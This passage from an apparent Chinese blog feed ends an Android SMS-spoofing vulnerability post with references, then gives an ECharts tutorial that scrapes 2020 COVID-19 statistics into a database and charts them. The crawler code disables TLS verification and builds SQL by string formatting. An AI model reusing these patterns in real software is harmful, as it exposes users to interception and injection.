<p>对于系统级的服务来说，存在欺骗漏洞是灾难性的，因为任何其他应用服务可能都会调用这个存在漏洞的系统服务，从而产生了漏洞的传播。由于权限设置不当而产生的错误非常值得引起开发者的注意。</p>
<h2 id="参考资料">参考资料</h2>
<ol>
<li><a href="https://www.csc2.ncsu.edu/faculty/xjiang4/smishing.html">https://www.csc2.ncsu.edu/faculty/xjiang4/smishing.html</a> （Smishing Vulnerability in Multiple Android Platforms (including Gingerbread, Ice Cream Sandwich, and Jelly Bean)）</li>
<li><a href="https://www.freebuf.com/articles/terminal/6169.html%EF%BC%88%E5%AF%B9Android%E6%9C%80%E6%96%B0fakesms%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%86%E6%9E%90%EF%BC%89">https://www.freebuf.com/articles/terminal/6169.html（对 Android 最新 fakesms 漏洞的分析）</a></li>
<li><a href="http://androidxref.com/">http://androidxref.com/</a>   4.0.3_r1 分支（/4.0.3_r1/xref）和 4.2_r1（/4.2_r1/xref）分支代码 </li>
<li><a href="https://github.com/thomascannon/android-sms-spoof">https://github.com/thomascannon/android-sms-spoof</a>  含有 POC 代码的安卓应用 </li>
</ol>
<hr class="footnotes-sep">
<section class="footnotes">
<ol class="footnotes-list">
<li id="fn1" class="footnote-item"><p><a href="http://androidxref.com/4.0.3_r1/xref/packages/apps/Mms/AndroidManifest.xml">http://androidxref.com/4.0.3_r1/xref/packages/apps/Mms/AndroidManifest.xml</a> <a href="#fnref1" class="footnote-backref">↩︎</a></p>
</li>
<li id="fn2" class="footnote-item"><p><a href="http://androidxref.com/4.2_r1/xref/packages/apps/Mms/AndroidManifest.xml">http://androidxref.com/4.2_r1/xref/packages/apps/Mms/AndroidManifest.xml</a> <a href="#fnref2" class="footnote-backref">↩︎</a></p>
</li>
</ol>
</section>
]]></content>
      <categories>
        <category>实验</category>
        <category>移动终端安全</category>
        <category>漏洞</category>
        <category>Android</category>
      </categories>
      <tags>
        <tag>网络空间安全</tag>
        <tag>移动终端安全</tag>
        <tag>Android</tag>
        <tag>安卓系统</tag>
      </tags>
  </entry>
  <entry>
    <title>使用 echarts 绘制 2020 疫情折线图</title>
    <url>/2020/04/02/works/frontend/echarts-drawing/</url>
    <content><![CDATA[<p>2020 年开始到现在的时间，真是发生了太多的事情，心情复杂，但又没有什么话好说，只能以有限的方式表达着对这些事件的思考。</p>
<p>最近买了个服务器，也正在着手搭建网站，利用一下我已经学到的前端知识，第一个应用性的内容，就以这次疫情的情况为出发点吧！</p>
<span id="more"></span>
<h2 id="了解-echarts">了解 echarts</h2>
<blockquote><p>ECharts，缩写来自 Enterprise Charts，商业级数据图表，是一个开源的数据可视化工具，一个纯 Javascript 的图表库，能够在 PC 端和移动设备上流畅运行，兼容当前绝大部分浏览器（IE6/7/8/9/10/11，chrome，firefox，Safari 等），底层依赖轻量级的 Canvas 库 ZRender，ECharts 提供直观，生动，可交互，可高度个性化定制的数据可视化图表。创新的拖拽重计算、数据视图、值域漫游等特性大大增强了用户体验，赋予了用户对数据进行挖掘、整合的能力。</p>
<footer><strong>echarts 百科 </strong><cite><a href="https://segmentfault.com/t/echarts/info">segmentfault.com/t/echarts/info</a></cite></footer></blockquote>
<h2 id="需求确定">需求确定</h2>
<p>使用一个绘图库（这要怎么手画啊.jpg），完成 2020 疫情的数据收集，并绘制折线图。</p>
<h3 id="准备零：工程建立">准备零：工程建立</h3>
<p>使用 IDE 新建一个 html5 工程，目录结构如下所示</p>
<img data-src="/2020/04/02/works/frontend/echarts-drawing/0.png" class="" title="dir">
<p>其实里面的大部分文件与这次任务并无太大关系，这样直接新建只是为了省事。</p>
<h3 id="准备一：绘图库">准备一：绘图库</h3>
<p>经过网上一番搜索和对比后，本次统计图绘图任务我选择用 echarts 来完成。它的首页是 <a href="https://www.echartsjs.com/zh/index.html">https://www.echartsjs.com/zh/index.html</a>，还蛮精美。</p>
<img data-src="/2020/04/02/works/frontend/echarts-drawing/1.png" class="" title="网站首页">
<p>点击 “下载” 来到它的下载界面。或直接访问 <a href="https://www.echartsjs.com/zh/download.html">https://www.echartsjs.com/zh/download.html</a>。</p>
<img data-src="/2020/04/02/works/frontend/echarts-drawing/2.png" class="" title="下载界面">
<p>网站提供了三种安装方式：</p>
<ol>
<li>从下载的源代码或编译产物安装</li>
<li>从 npm 安装（<code>npm install echarts</code>）</li>
<li>选择所需模块，在线定制安装</li>
</ol>
<p>由于这次任务并不需要所有的图表支持，我选择第三种安装方式，点击 “在线定制” 即可进入定制页面。</p>
<img data-src="/2020/04/02/works/frontend/echarts-drawing/3.png" class="">
<p>选择需要的图表、坐标系、组件类型，在开发环境中我选择保留 IE8 的兼容性，同时不选择 “代码压缩” 以方便调试。</p>
<div class="group-picture"><div class="group-picture-row"><div class="group-picture-column"><img data-src="/2020/04/02/works/frontend/echarts-drawing/4-chart.png" class="" title="图表类型"></div><div class="group-picture-column"><img data-src="/2020/04/02/works/frontend/echarts-drawing/4-coordinate.png" class="" title="坐标系"></div></div><div class="group-picture-row"><div class="group-picture-column"><img data-src="/2020/04/02/works/frontend/echarts-drawing/4-component.png" class="" title="组件"></div><div class="group-picture-column"><img data-src="/2020/04/02/works/frontend/echarts-drawing/4-others.png" class="" title="其它选项"></div></div></div>
<p>点击 “下载” 后，会出现一个编译界面，待到用到的所有组件加入完毕后，就可以下载生成的 js 文件了，默认文件名为 <code>echarts.js</code>，我们把它保存在事先建好网页工程的 js 文件夹中。</p>
<img data-src="/2020/04/02/works/frontend/echarts-drawing/4-compile.png" class="" title="编译">
<img data-src="/2020/04/02/works/frontend/echarts-drawing/4-save.png" class="" title="下载">
<p>同时生成一份 “代码压缩” 版的 js 以供线上利用，这个默认文件名为 <code>echarts.min.js</code></p>
<img data-src="/2020/04/02/works/frontend/echarts-drawing/4-save-compressed.png" class="" title="下载-压缩版">
<p>下载好所需的 js 文件以后，就可以开始工作了～</p>
<ol>
<li>
<p>建立一个空的 html 文档，填写必要的网页信息。</p>
<figure class="highlight html"><figcaption><span>index.html</span></figcaption><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!doctype <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">class</span>=<span class="string">"no-js"</span> <span class="attr">lang</span>=<span class="string">"zh"</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span>&gt;</span>2020肺炎疫情数据 - 即时更新<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!--省略其余meta相关代码--&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!--省略jQuery相关代码--&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure>
</li>
<li>
<p>引入 <code>echarts.js</code></p>
<div class="note info"><p>在线上环境时，我们将引入 <code>echarts.min.js</code></p>
</div>
<figure class="highlight html"><figcaption><span>index.html</span></figcaption><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--head标签下--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"js/echarts.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure>
</li>
<li>
<p>为 Echarts 准备一个具有高宽的 DOM 容器</p>
<figure class="highlight html"><figcaption><span>index.html</span></figcaption><table><tbody><tr><td class="code"><pre><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">   <span class="comment">&lt;!-- 为 ECharts 准备一个具备大小（宽高）的 DOM --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"main"</span> <span class="attr">style</span>=<span class="string">"width: 600px;height:400px;"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure>
</li>
<li>
<p>通过 <code>echarts.init</code> 方法初始化一个 echarts 实例，并通过 <code>setOption</code> 方法生成一个简单的统计图，大概是像这样的格式：</p>
<figure class="highlight html"><figcaption><span>index.html</span></figcaption><table><tbody><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">	 <span class="comment">// 基于准备好的dom，初始化echarts实例</span></span></span><br><span class="line"><span class="language-javascript">	<span class="keyword">var</span> myChart = echarts.<span class="title function_">init</span>(<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">'main'</span>));</span></span><br><span class="line"><span class="language-javascript">	<span class="keyword">var</span> option = {...}; <span class="comment">//这里做好设置和填充数据</span></span></span><br><span class="line"><span class="language-javascript">	myChart.<span class="title function_">setOption</span>(option); <span class="comment">//使用刚指定的配置项和数据显示图表</span></span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure>
<ul>
<li>
<p><code>options</code> 中要怎么指定设置和数据呢？别急，我们先来看它的官方示例数据和它渲染出来的图：</p>
  <div class="tabs" id="code_show"><ul class="nav-tabs"><li class="tab active"><a href="#code_show-1"><i class="fa fa-code"></i>代码</a></li><li class="tab"><a href="#code_show-2"><i class="fa fa-image"></i>示意图</a></li></ul><div class="tab-content"><div class="tab-pane active" id="code_show-1"><figure class="highlight javascript"><figcaption><span>main.js</span></figcaption><table><tbody><tr><td class="code"><pre><span class="line"> option = {</span><br><span class="line">     <span class="attr">xAxis</span>: {</span><br><span class="line"><span class="attr">type</span>: <span class="string">'category'</span>,</span><br><span class="line"><span class="attr">data</span>: [<span class="string">'Mon'</span>, <span class="string">'Tue'</span>, <span class="string">'Wed'</span>, <span class="string">'Thu'</span>, <span class="string">'Fri'</span>, <span class="string">'Sat'</span>, <span class="string">'Sun'</span>]</span><br><span class="line">     },</span><br><span class="line">     <span class="attr">yAxis</span>: {</span><br><span class="line"> 	    <span class="attr">type</span>: <span class="string">'value'</span></span><br><span class="line">     },</span><br><span class="line">     <span class="attr">series</span>: [{</span><br><span class="line"><span class="attr">data</span>: [<span class="number">820</span>, <span class="number">932</span>, <span class="number">901</span>, <span class="number">934</span>, <span class="number">1290</span>, <span class="number">1330</span>, <span class="number">1320</span>],</span><br><span class="line"><span class="attr">type</span>: <span class="string">'line'</span></span><br><span class="line">     }]</span><br><span class="line"> };</span><br></pre></td></tr></tbody></table></figure></div><div class="tab-pane" id="code_show-2"><img data-src="/2020/04/02/works/frontend/echarts-drawing/5.png" class="" title="单行显示"></div></div></div>
<ul>
<li>
<p>option 中有 xAxis、yAxis、series 三个对象，它们都拥有 type 和 data 两个属性。对于这个简单的示例来说：</p>
<ul>
<li>xAxis 是横轴数据及类型描述</li>
<li> yAxis 是纵轴数据及类型描述</li>
<li> series 是系列描述，可以包含多组 “统计数据”  <div class="note info"><p>在 echarts 里，系列（series）是指：一组数值以及他们映射成的图。“系列” 这个词原本可能来源于 “一系列的数据”，而在 echarts 中取其扩展的概念，不仅表示数据，也表示数据映射成为的图。所以，一个 <strong>系列</strong>包含的要素至少有：一组数值、图表类型（series.type）、以及其他的关于这些数据如何映射成图的参数。</p>
</div> 
<ul>
<li>实际上，这也意味着可以在一个 echarts 对象上同时绘制多组类型各同或各异的统计数据（注意到 series 是一个数组！）！如果把以上例子的 series 数据稍作修改，就可以得到多折线的统计图，这也是本次数据处理任务的重要模型！  <div class="tabs" id="code_show2"><ul class="nav-tabs"><li class="tab active"><a href="#code_show2-1"><i class="fa fa-code"></i>代码</a></li><li class="tab"><a href="#code_show2-2"><i class="fa fa-image"></i>示意图</a></li></ul><div class="tab-content"><div class="tab-pane active" id="code_show2-1"><figure class="highlight javascript"><table><tbody><tr><td class="code"><pre><span class="line">option = {</span><br><span class="line">    <span class="attr">xAxis</span>: {</span><br><span class="line">        <span class="attr">type</span>: <span class="string">'category'</span>,</span><br><span class="line">        <span class="attr">data</span>: [<span class="string">'Mon'</span>, <span class="string">'Tue'</span>, <span class="string">'Wed'</span>, <span class="string">'Thu'</span>, <span class="string">'Fri'</span>, <span class="string">'Sat'</span>, <span class="string">'Sun'</span>]</span><br><span class="line">    },</span><br><span class="line">    <span class="attr">yAxis</span>: {</span><br><span class="line">        <span class="attr">type</span>: <span class="string">'value'</span></span><br><span class="line">    },</span><br><span class="line">    <span class="attr">series</span>: [</span><br><span class="line">        {</span><br><span class="line">            <span class="attr">data</span>: [<span class="number">820</span>, <span class="number">932</span>, <span class="number">901</span>, <span class="number">934</span>, <span class="number">1290</span>, <span class="number">1330</span>, <span class="number">1320</span>],</span><br><span class="line">            <span class="attr">type</span>: <span class="string">'line'</span></span><br><span class="line">        },</span><br><span class="line">        {</span><br><span class="line">            <span class="attr">data</span>: [<span class="number">100</span>,<span class="number">170</span>,<span class="number">250</span>,<span class="number">330</span>,<span class="number">440</span>,<span class="number">114</span>,<span class="number">225</span>],</span><br><span class="line">            <span class="attr">type</span>: <span class="string">'line'</span></span><br><span class="line">        }</span><br><span class="line">    ]</span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure></div><div class="tab-pane" id="code_show2-2"><img data-src="/2020/04/02/works/frontend/echarts-drawing/6.png" class="" title="多行折线图"></div></div></div>
</li>
</ul>
</li>
</ul>
</li>
<li>
<p>xAxis、yAxis、series 实质为统计图的 “组件”。在 echarts 中，各种内容都是被抽象为 “组件” 的，除了前述的 xAxis、yAxis、series 以外，还有 grid、polar、geo 等组件，与本次任务关系并不大。</p>
<ul>
<li>所有的组件都在 option 对象中声明，可以是一个对象或者数组。</li>
</ul>
</li>
<li>
<p>上层的 option 对象描述了图表的各种需求，包括：有什么数据、要画什么图表、图表长什么样子、含有什么组件、组件能操作什么事情等等。这些设置内容通过 <code>setOption</code> 函数绑定到 echarts 对象上。</p>
  <figure class="highlight javascript"><table><tbody><tr><td class="code"><pre><span class="line">        <span class="comment">// 用 option 描述数据、数据如何映射成图形、交互行为等。</span></span><br><span class="line">        <span class="comment">// option 是个大的 JavaScript 对象。</span></span><br><span class="line">        <span class="keyword">var</span> option = {</span><br><span class="line">            <span class="comment">// option 每个属性是一类组件。</span></span><br><span class="line"><span class="attr">legend</span>: {...},</span><br><span class="line"><span class="attr">grid</span>: {...},</span><br><span class="line">            <span class="attr">tooltip</span>: {...},</span><br><span class="line">            <span class="attr">toolbox</span>: {...},</span><br><span class="line">            <span class="attr">dataZoom</span>: {...},</span><br><span class="line">            <span class="attr">visualMap</span>: {...},</span><br><span class="line">            <span class="comment">// 如果有多个同类组件，那么就是个数组。例如这里有三个 X 轴。</span></span><br><span class="line"><span class="attr">xAxis</span>: [</span><br><span class="line">                <span class="comment">// 数组每项表示一个组件实例，用 type 描述“子类型”。</span></span><br><span class="line">	{<span class="attr">type</span>: <span class="string">'category'</span>, <span class="comment">/*...*/</span>},</span><br><span class="line">	{<span class="attr">type</span>: <span class="string">'category'</span>, ...},</span><br><span class="line">	{<span class="attr">type</span>: <span class="string">'value'</span>, ...}</span><br><span class="line">],</span><br><span class="line"><span class="attr">yAxis</span>: [{...}, {...}],</span><br><span class="line">            <span class="comment">// 这里有多个系列，也是构成一个数组。</span></span><br><span class="line"><span class="attr">series</span>: [</span><br><span class="line">                <span class="comment">// 每个系列，也有 type 描述“子类型”，即“图表类型”。</span></span><br><span class="line">	{<span class="attr">type</span>: <span class="string">'line'</span>, <span class="attr">data</span>: [[<span class="string">'AA'</span>, <span class="number">332</span>], [<span class="string">'CC'</span>, <span class="number">124</span>], [<span class="string">'FF'</span>, <span class="number">412</span>], <span class="regexp">/_ ... _/</span> ]},</span><br><span class="line">	{<span class="attr">type</span>: <span class="string">'line'</span>, <span class="attr">data</span>: [<span class="number">2231</span>, <span class="number">1234</span>, <span class="number">552</span>, <span class="comment">/* ... */</span> ]},</span><br><span class="line">	{<span class="attr">type</span>: <span class="string">'line'</span>, <span class="attr">data</span>: [[<span class="number">4</span>, <span class="number">51</span>], [<span class="number">8</span>, <span class="number">12</span>], <span class="comment">/* ... */</span> ]}</span><br><span class="line">]</span><br><span class="line">        };</span><br></pre></td></tr></tbody></table></figure>
<ul>
<li>
<p>数据都在 <code>series.data</code> 中，也可通过 dataset 来取得数据。</p>
  <figure class="highlight javascript"><table><tbody><tr><td class="code"><pre><span class="line"> <span class="keyword">var</span> option = {</span><br><span class="line">  <span class="attr">dataset</span>: {</span><br><span class="line">   <span class="attr">source</span>: [</span><br><span class="line">    [<span class="number">121</span>, <span class="string">"XX"</span>, <span class="number">442</span>, <span class="number">43.11</span>],</span><br><span class="line">    [<span class="number">663</span>, <span class="string">"ZZ"</span>, <span class="number">311</span>, <span class="number">91.14</span>],</span><br><span class="line">    [<span class="number">913</span>, <span class="string">"ZZ"</span>, <span class="number">312</span>, <span class="number">92.12</span>],</span><br><span class="line"><span class="comment">/* ... */</span></span><br><span class="line">   ],</span><br><span class="line">  },</span><br><span class="line">  <span class="attr">xAxis</span>: {},</span><br><span class="line">  <span class="attr">yAxis</span>: {},</span><br><span class="line">  <span class="attr">series</span>: [</span><br><span class="line">   <span class="comment">// 数据从 dataset 中取，encode 中的数值是 dataset.source 的维度 index（即第几列）</span></span><br><span class="line">   { <span class="attr">type</span>: <span class="string">"bar"</span>, <span class="attr">encode</span>: { <span class="attr">x</span>: <span class="number">1</span>, <span class="attr">y</span>: <span class="number">0</span> } },</span><br><span class="line">   { <span class="attr">type</span>: <span class="string">"bar"</span>, <span class="attr">encode</span>: { <span class="attr">x</span>: <span class="number">1</span>, <span class="attr">y</span>: <span class="number">2</span> } },</span><br><span class="line">   { <span class="attr">type</span>: <span class="string">"scatter"</span>, <span class="attr">encode</span>: { <span class="attr">x</span>: <span class="number">1</span>, <span class="attr">y</span>: <span class="number">3</span> } },</span><br><span class="line">   <span class="comment">/* ... */</span></span><br><span class="line">  ],</span><br><span class="line"> };</span><br></pre></td></tr></tbody></table></figure>
</li>
</ul>
<blockquote>
<p>总的来说，option 表述了：数据、数据如何映射成图形、交互行为。</p>
</blockquote>
</li>
<li>
<p>通过以上这几个步骤，我们可以绘制一个简单的统计图。</p>
</li>
</ul>
</li>
</ul>
</li>
</ol>
<h3 id="准备二：数据">准备二：数据</h3>
<p>本次使用的数据源为<a href="https://ncov.dxy.cn/ncovh5/view/pneumonia">丁香园疫情实时播报网页</a>。打开网站发现我们所要的数据在这里呈现：</p>
<img data-src="/2020/04/02/works/frontend/echarts-drawing/7.png" class="" title="网站页面">
<p>右键或者 F12 打开开发者模式，发现数据来源为这段 JavaScript 代码</p>
<img data-src="/2020/04/02/works/frontend/echarts-drawing/8.png" class="" title="页面代码">
<p>其中正好有我们需要的数据</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">{</span><br><span class="line">	/* .... */</span><br><span class="line">	currentConfirmedCount: 2934, //现存确诊</span><br><span class="line">	confirmedCount: 82691, //累计确诊数</span><br><span class="line">	suspectedCount: 806, //境外输入</span><br><span class="line">	curedCount: 76436, //累计治愈数</span><br><span class="line">	deadCount: 3321, //累计死亡数</span><br><span class="line">	/* .... */</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<p>使用 python requests 库爬下来，扔进 BeautifulSoup 解析一通，然后存到数据库中，其中数据库的结构为</p>
<figure class="highlight sql"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> `<span class="number">2020</span>_pneumonia`</span><br><span class="line">(</span><br><span class="line">  last_since datetime <span class="keyword">null</span>, # 上次数据更新时间</span><br><span class="line">  proved <span class="type">int</span> <span class="keyword">null</span>, # 已确诊数</span><br><span class="line">  uncertain <span class="type">int</span> <span class="keyword">null</span>, # 未确诊数</span><br><span class="line">  died <span class="type">int</span> <span class="keyword">null</span>, # 死亡数</span><br><span class="line">  cured <span class="type">int</span> <span class="keyword">null</span> # 治愈数</span><br><span class="line">);</span><br></pre></td></tr></tbody></table></figure>
<figure class="highlight python"><figcaption><span>crawl.py</span></figcaption><table><tbody><tr><td class="code"><pre><span class="line">req = requests.get(url=<span class="string">'https://ncov.dxy.cn/ncovh5/view/pneumonia'</span>, headers=headers, verify=<span class="literal">False</span>)</span><br><span class="line">req.encoding = req.apparent_encoding</span><br><span class="line">soup = BeautifulSoup(req.text, <span class="string">'html.parser'</span>)</span><br><span class="line">final_data = {}</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">  <span class="keyword">import</span> json</span><br><span class="line">  json_text = soup.find(<span class="string">'script'</span>, {<span class="string">'id'</span>: <span class="string">'getStatisticsService'</span>}).get_text().replace(</span><br><span class="line">  <span class="string">'try { window.getStatisticsService = '</span>,</span><br><span class="line">  <span class="string">''</span>).replace(<span class="string">'catch(e){}'</span>, <span class="string">''</span>)</span><br><span class="line">  json_text = json_text[:-<span class="number">1</span>]</span><br><span class="line">  data_dict = json.loads(json_text)</span><br><span class="line">  final_data[<span class="string">'confirmed'</span>] = <span class="built_in">int</span>(data_dict[<span class="string">'confirmedCount'</span>])</span><br><span class="line">  final_data[<span class="string">'suspected'</span>] = <span class="built_in">int</span>(data_dict[<span class="string">'suspectedCount'</span>])</span><br><span class="line">  final_data[<span class="string">'cured'</span>] = <span class="built_in">int</span>(data_dict[<span class="string">'curedCount'</span>])</span><br><span class="line">  final_data[<span class="string">'dead'</span>] = <span class="built_in">int</span>(data_dict[<span class="string">'deadCount'</span>])</span><br><span class="line">  final_data[<span class="string">'last_since'</span>] = data_dict[<span class="string">'modifyTime'</span>]  <span class="comment"># "modifyTime":单位是 ms!</span></span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">  <span class="comment"># json 解析出错，几乎不可能出现（因为这样的话原来以js驱动的网页也显示不出数据了）</span></span><br><span class="line">  quit(-<span class="number">1</span>)</span><br><span class="line"><span class="keyword">finally</span>:</span><br><span class="line">  <span class="keyword">try</span>:</span><br><span class="line">	<span class="keyword">import</span> datetime,time</span><br><span class="line">	<span class="comment"># 省略连库过程</span></span><br><span class="line">	cur.execute(<span class="string">'select last_since from 2020_pneumonia order by last_since desc'</span>)</span><br><span class="line">	ret = cur.fetchone()</span><br><span class="line">	logger.info(ret)  <span class="comment"># {'last_since': datetime.datetime(2020, 2, 9, 22, 55)}</span></span><br><span class="line">	ret_time = ret.get(<span class="string">'last_since'</span>)</span><br><span class="line">	local_time = datetime.datetime.fromtimestamp(final_data[<span class="string">'last_since'</span>]/<span class="number">1000</span>)</span><br><span class="line">	<span class="keyword">if</span> ret_time == local_time:</span><br><span class="line">	  logger.info(<span class="string">"[*]No need to insert!"</span>)</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">	  date_in = datetime.datetime.fromtimestamp(final_data[<span class="string">'last_since'</span>]/<span class="number">1000</span>).strftime(<span class="string">"%Y-%m-%d %H:%M:%S"</span>)</span><br><span class="line">      proved = final_data[<span class="string">'confirmed'</span>]</span><br><span class="line">	  uncertain = final_data[<span class="string">'suspected'</span>]</span><br><span class="line">      died = final_data[<span class="string">'dead'</span>]</span><br><span class="line">      cured = final_data[<span class="string">'cured'</span>]</span><br><span class="line">      sql = <span class="string">"insert into 2020_pneumonia values('%s',%d,%d,%d,%d);"</span>%(date_in,proved,uncertain,died,cured)</span><br><span class="line">      cur.execute(sql)</span><br><span class="line">      conn.commit()</span><br><span class="line">      logger.info(<span class="string">"[√]Insert success!"</span>)</span><br><span class="line">  <span class="keyword">finally</span>:</span><br><span class="line">    conn.close()</span><br></pre></td></tr></tbody></table></figure>
<h3 id="准备三：数据交互">准备三：数据交互</h3>
<p>编写一个 php 接口，借以从数据库中获取数据，其中接口行为设计如下：</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">POST api.php HTTP /1.1</span><br><span class="line">action=getfulldata 获得全部数据，对应的 SQL 语句为 select _ from 表名，最多加上个 limit</span><br><span class="line">action=getlatest 得到最新数据，对应的 SQL 语句可以写为 select _ from 表名 order by last_since desc limit 1</span><br><span class="line">action=getsingleday&amp;param={Y-m-d} 得到某一天的统计数据，SQL 语句是一个简单的条件查询，不再赘述了</span><br></pre></td></tr></tbody></table></figure>
<p>稍后会在 html 网页中用 jQuery ajax 技术调用这个接口。</p>
<h2 id="编写主网页">编写主网页</h2>
<ol>
<li>
<p>在 <code>body</code> 标签中，准备一个 <code>div</code> 容器，一会放我们的 echarts 图表。这个容器需要指明一个高度</p>
 <figure class="highlight html"><figcaption><span>index.html</span></figcaption><table><tbody><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"chartbox"</span> <span class="attr">style</span>=<span class="string">"width:100%;height:100%;margin:0 auto"</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"main"</span> <span class="attr">style</span>=<span class="string">"width: 600px;height:calc(70% + 10px);margin:0 auto;"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure>
</li>
<li>
<p>在 <code>div</code> 容器中初始化 echarts 对象</p>
 <figure class="highlight javascript"><figcaption><span>index.html</span></figcaption><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> main = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">"main"</span>);</span><br><span class="line"><span class="keyword">var</span> chart = echarts.<span class="title function_">init</span>(main, <span class="string">"light"</span>); <span class="comment">//设置echarts显示主题为亮色主题</span></span><br></pre></td></tr></tbody></table></figure>
</li>
<li>
<p>图标样式设置（chartOptions）</p>
 <figure class="highlight javascript"><figcaption><span>main.js</span></figcaption><table><tbody><tr><td class="code"><pre><span class="line">chartoption = {</span><br><span class="line">	<span class="attr">title</span>: {</span><br><span class="line">		<span class="attr">text</span>: <span class="string">"2020肺炎疫情数据"</span>,</span><br><span class="line">		<span class="attr">lineHeight</span>: <span class="number">40</span>,</span><br><span class="line">		<span class="attr">height</span>: <span class="number">40</span>,</span><br><span class="line">		<span class="attr">subtext</span>: <span class="string">"数据来源:丁香园·丁香医生"</span>,</span><br><span class="line">		<span class="attr">sublink</span>: <span class="string">"https://ncov.dxy.cn/ncovh5/view/pneumonia"</span>,</span><br><span class="line">	},</span><br><span class="line">	<span class="attr">dataZoom</span>: [</span><br><span class="line">		{</span><br><span class="line">			<span class="attr">id</span>: <span class="string">"dataZoomX"</span>,</span><br><span class="line">			<span class="attr">type</span>: <span class="string">"inside"</span>,</span><br><span class="line">			<span class="attr">xAxisIndex</span>: [<span class="number">0</span>],</span><br><span class="line">			<span class="attr">filterMode</span>: <span class="string">"empty"</span>,</span><br><span class="line">		},</span><br><span class="line">		{</span><br><span class="line">			<span class="attr">id</span>: <span class="string">"dataZoomY"</span>,</span><br><span class="line">			<span class="attr">type</span>: <span class="string">"inside"</span>,</span><br><span class="line">			<span class="attr">yAxisIndex</span>: [<span class="number">0</span>],</span><br><span class="line">			<span class="attr">filterMode</span>: <span class="string">"empty"</span>,</span><br><span class="line">		},</span><br><span class="line">	],</span><br><span class="line">	<span class="attr">dataset</span>: {</span><br><span class="line">		<span class="attr">dimensions</span>: [<span class="string">"last_since"</span>, <span class="string">"proved"</span>, <span class="string">"uncertain"</span>, <span class="string">"died"</span>, <span class="string">"cured"</span>],</span><br><span class="line">		<span class="attr">source</span>: [</span><br><span class="line">			<span class="comment">// {last_since:xx(datetime),proved:xx(int),uncertain:xx(int),died:xx(int),cured:(int)}</span></span><br><span class="line">		],</span><br><span class="line">	},</span><br><span class="line">	<span class="attr">tooltip</span>: {</span><br><span class="line">		<span class="attr">trigger</span>: <span class="string">"axis"</span>,</span><br><span class="line">	},</span><br><span class="line">	<span class="attr">toolbox</span>: {</span><br><span class="line">		<span class="attr">show</span>: <span class="literal">true</span>,</span><br><span class="line">		<span class="attr">orient</span>: <span class="string">"vertical"</span>,</span><br><span class="line">		<span class="attr">top</span>: <span class="number">20</span>,</span><br><span class="line">		<span class="attr">feature</span>: {</span><br><span class="line">			<span class="attr">dataZoom</span>: {</span><br><span class="line">				<span class="attr">yAxisIndex</span>: <span class="string">"none"</span>,</span><br><span class="line">			},</span><br><span class="line">			<span class="comment">// dataView: {</span></span><br><span class="line">			<span class="comment">//     readOnly: true</span></span><br><span class="line">			<span class="comment">// },</span></span><br><span class="line">			<span class="attr">restore</span>: {},</span><br><span class="line">			<span class="attr">saveAsImage</span>: {</span><br><span class="line">				<span class="attr">title</span>: <span class="string">"保存为图片…"</span>,</span><br><span class="line">			},</span><br><span class="line">		},</span><br><span class="line">	},</span><br><span class="line">	<span class="attr">legend</span>: {</span><br><span class="line">		<span class="attr">type</span>: <span class="string">"scroll"</span>,</span><br><span class="line">		<span class="attr">data</span>: [<span class="string">"proved"</span>, <span class="string">"uncertain"</span>, <span class="string">"died"</span>, <span class="string">"cured"</span>],</span><br><span class="line">		<span class="attr">left</span>: <span class="string">"right"</span>,</span><br><span class="line">	},</span><br><span class="line">	<span class="attr">xAxis</span>: {</span><br><span class="line">		<span class="attr">type</span>: 